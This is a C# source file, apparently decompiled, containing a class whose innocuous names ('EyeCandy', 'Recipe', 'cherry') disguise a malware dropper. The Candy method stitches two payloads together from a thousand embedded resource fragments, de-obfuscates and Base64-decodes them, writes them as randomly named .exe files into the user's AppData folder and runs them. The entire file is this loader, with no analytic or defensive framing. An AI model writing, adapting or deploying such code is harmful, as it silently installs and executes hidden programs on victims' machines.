using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using v_BrunoShift;

namespace v_EyeCandy;

public static class EyeCandy
{
	public static int RecipeCount = 1000;

	public static void Candy()
	{
		BrunoShifter.Initialize();
		string s = BrunoShifter.DeBruno(GetRecipe());
		byte[] bytes = Convert.FromBase64String(s);
		Random random = new Random();
		string path = "file" + random.Next(1, 400000) + ".exe";
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path);
		File.WriteAllBytes(text, bytes);
		Process.Start(text);
		string s2 = BrunoShifter.DeBruno(GetAltRecipe());
		byte[] bytes2 = Convert.FromBase64String(s2);
		path = "file" + random.Next(1, 400000) + ".exe";
		text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path);
		File.WriteAllBytes(text, bytes2);
		Process.Start(text);
	}

	private static string GetRecipe()
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < RecipeCount; i++)
		{
			ResourceManager resourceManager = new ResourceManager("pretentious" + i, Assembly.GetExecutingAssembly());
			string value = (string)resourceManager.GetObject("cherry");
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	private static string GetAltRecipe()
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < RecipeCount; i++)
		{
			ResourceManager resourceManager = new ResourceManager("pretent" + i, Assembly.GetExecutingAssembly());
			string value = (string)resourceManager.GetObject("cherry");
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}
}
